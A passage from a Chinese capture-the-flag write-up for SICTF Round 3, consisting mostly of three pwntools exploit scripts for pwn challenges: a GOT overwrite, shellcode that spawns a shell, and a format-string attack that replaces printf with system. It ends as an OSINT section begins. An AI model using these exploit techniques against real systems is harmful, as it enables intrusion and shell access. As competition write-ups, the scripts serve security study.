33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">yuanshen.life</span><span class="sh">'</span><span class="p">,</span><span class="mi">35259</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x002391
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./EeeeasyCpp</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">pwd</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">G</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Enter your name: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Enter your password: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">'</span><span class="s">ll give you a gift: </span><span class="sh">"</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="mh">0x02650</span>
<span class="n">bd</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x22E0</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">strlen</span><span class="sh">'</span><span class="p">]</span>
<span class="nf">ls</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">elf_base</span><span class="p">))</span>

<span class="n">t1</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mi">19784</span>
<span class="nf">ls</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">t1</span><span class="p">))</span>

<span class="nf">get_</span><span class="p">(</span><span class="sh">'</span><span class="s">a1</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">t1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="nf">get_</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">bd</span><span class="p">),</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="bug_zapper"><span class="me-2">(🩸)Bug_Zapper</span><a href="#bug_zapper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./bugzapper</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>


<span class="c1">#for i in range(0x11):
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0xb</span><span class="p">,</span><span class="mh">0x11</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">yuanshen.life</span><span class="sh">'</span><span class="p">,</span><span class="mi">34331</span><span class="p">)</span>
    <span class="n">sc</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    xchg eax,esi
    mov edx,esi
    syscall
    </span><span class="sh">'''</span>
    <span class="n">sc</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>

    <span class="c1">#gdb.attach(io,'b *0x401092')
</span>    <span class="n">pay</span> <span class="o">=</span> <span class="n">sc</span>
    <span class="c1">#io.interactive()
</span>    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>

    <span class="nf">pause</span><span class="p">()</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x10</span>
    <span class="n">pay</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216152712-4k8vm76.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216152712-4k8vm76.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="easy_si"><span class="me-2">(🩸)Easy_SI</span><a href="#easy_si" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">yuanshen.life</span><span class="sh">'</span><span class="p">,</span><span class="mi">33150</span><span class="p">)</span>

<span class="c1">#pay = 'AAAAAAAA' + '%p%p%p%p%p%p'
</span><span class="n">pay</span> <span class="o">=</span> <span class="sh">'</span><span class="s">%p</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x30</span>
<span class="c1">#0x401277 # stack_leak
#0x400000 # elf_base
</span><span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s"> # gcc -no-pie  # a.out
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7c80e50 (puts) ◂— endbr64
[0x404020] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64
[0x404028] printf@GLIBC_2.2.5 -&gt; 0x7ffff7c606f0 (printf) ◂— endbr64
[0x404030] read@GLIBC_2.2.5 -&gt; 0x7ffff7d147d0 (read) ◂— endbr64
</span><span class="sh">'''</span><span class="p">)</span>


<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%7$sAAAA</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x404018</span><span class="p">)</span> <span class="c1"># puts
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Welcome to SICTF and Do you like pwn?</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">And now let</span><span class="sh">'</span><span class="s">s start the game!!!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>

<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x404018</span><span class="o">+</span><span class="mh">0x18</span> <span class="c1"># test offset printf
</span><span class="n">pay</span> <span class="o">=</span> <span class="nf">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system</span><span class="p">})</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">And now let</span><span class="sh">'</span><span class="s">s start the game!!!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>


</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="forensice"><span class="me-2">Forensice</span><a href="#forensice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="osint签到"><span class="me-2"><strong>OSINT签到</strong></span><a href="#osint签到" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>1.直接百度识图发现一样的地方，双击进去发现是红城湖公园</p>

